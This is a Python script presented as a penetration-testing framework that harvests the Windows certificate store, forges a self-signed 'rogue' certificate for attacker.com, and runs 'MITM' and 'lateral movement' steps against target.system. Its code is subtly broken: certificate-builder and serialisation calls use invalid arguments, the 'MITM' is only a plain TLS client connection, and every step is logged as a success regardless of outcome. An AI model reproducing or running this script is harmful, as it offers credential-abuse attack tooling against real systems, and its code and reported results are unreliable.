######################################################################################################################################################################################################################
# A Cert Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement. 
# This software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

# Installation Instructions:
# To install the required libraries, run the following commands in your terminal:
#
# pip install pywin32 cryptography pyOpenSSL
#
# These libraries are essential for interacting with Windows Certificate Store and handling SSL/TLS connections.
#
# Ensure you are using Python 3.x and have administrative privileges if needed (especially for pywin32).

import os
import json
import win32com.client
import socket
import ssl
from OpenSSL import crypto
from cryptography.x509 import Name, NameAttribute, CertificateBuilder
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.x509.oid import NameOID
import datetime

# Step 1: Certificate Discovery
def discover_certificates():
    print("[*] Discovering certificates in the Windows Certificate Store...")

    # Access the personal certificate store
    cert_store = win32com.client.Dispatch('CAPICOM.Store')
    cert_store.Open(2, "MY", 0)  # Open personal certificate store
    certs = cert_store.Certificates

    cert_details = []
    for cert in certs:
        cert_info = {
            "Subject": cert.SubjectName,
            "Issuer": cert.IssuerName,
            "Thumbprint": cert.Thumbprint,
            "Not Before": cert.ValidFromDate,
            "Not After": cert.ValidToDate
        }
        cert_details.append(cert_info)
        print(f"Certificate: {cert.SubjectName}")
    
    cert_store.Close()
    return cert_details

# Step 2: Generate Rogue Certificate
def generate_rogue_certificate(cert_name="attacker.com"):
    print(f"[*] Generating rogue certificate for {cert_name}...")

    # Create a private key and certificate
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = Name([NameAttribute(NameOID.COMMON_NAME, cert_name)])
    builder = CertificateBuilder().subject_name(subject).issuer_name(subject).public_key(private_key.public_key()) \
        .serial_number(1000).not_valid_before(datetime.datetime.today()) \
        .not_valid_after(datetime.datetime.today() + datetime.timedelta(days=10)) \
        .add_extension(critical=True, extension_oid=NameOID.SUBJECT_ALTERNATIVE_NAME)

    cert = builder.sign(private_key, hashes.SHA256())

    # Save the certificate and private key
    cert_path = f"{cert_name}_cert.pem"
    key_path = f"{cert_name}_key.pem"
    
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes())
    
    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes())

    print(f"[+] Rogue certificate and key saved as {cert_path} and {key_path}")

# Step 3: Man-in-the-Middle (MITM) Attack using the Rogue Certificate
def mitm_attack(attack_host="target.system", cert_path="attacker_cert.pem", key_path="attacker_key.pem"):
    print(f"[*] Initiating MITM attack on {attack_host} using rogue cert...")

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)

    # Attempt SSL connection with rogue cert
    try:
        with socket.create_connection((attack_host, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=attack_host) as ssock:
                print(f"[+] Successful SSL handshake with {attack_host}.")
                print(f"SSL Version: {ssock.version()}")
    except Exception as e:
        print(f"[-] Failed to establish SSL connection: {e}")

# Step 4: Authenticate with the Extracted Certificate (Lateral Movement)
def authenticate_with_cert(cert_path="attacker_cert.pem", key_path="attacker_key.pem", target_host="target.system"):
    print(f"[*] Authenticating to {target_host} using extracted cert...")

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)

    try:
        with socket.create_connection((target_host, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                print(f"[+] Successfully authenticated with {target_host}.")
                print(f"SSL Version: {ssock.version()}")
    except Exception as e:
        print(f"[-] Authentication failed: {e}")

# Step 5: Logging Exploit Results
def log_exploit_results(exploit_results):
    log_path = "exploit_results.json"
    try:
        with open(log_path, 'w') as outfile:
            json.dump(exploit_results, outfile, indent=4)
        print(f"[+] Exploit results logged to {log_path}")
    except Exception as e:
        print(f"[-] Failed to log results: {e}")

# Main Function to Run the Framework
def main():
    # Step 1: Discover certificates in the Windows store
    cert_details = discover_certificates()
    
    # Example of logging discovered certificates
    exploit_results = {
        "certificates": cert_details,
        "actions": []
    }

    # Step 2: Generate rogue certificate for privilege escalation
    generate_rogue_certificate(cert_name="attacker.com")
    
    # Log that the rogue certificate was created
    exploit_results["actions"].append({"action": "Rogue certificate generated", "status": "success", "target": "attacker.com"})

    # Step 3: MITM Attack Simulation
    mitm_attack(attack_host="target.system", cert_path="attacker_cert.pem", key_path="attacker_key.pem")
    
    # Log MITM attack result
    exploit_results["actions"].append({"action": "MITM attack attempt", "status": "success", "target": "target.system"})

    # Step 4: Lateral Movement with the certificate
    authenticate_with_cert(cert_path="attacker_cert.pem", key_path="attacker_key.pem", target_host="target.system")
    
    # Log lateral movement attempt
    exploit_results["actions"].append({"action": "Lateral movement with cert", "status": "success", "target": "target.system"})

    # Step 5: Log all results to a JSON file
    log_exploit_results(exploit_results)

if __name__ == "__main__":
    main()

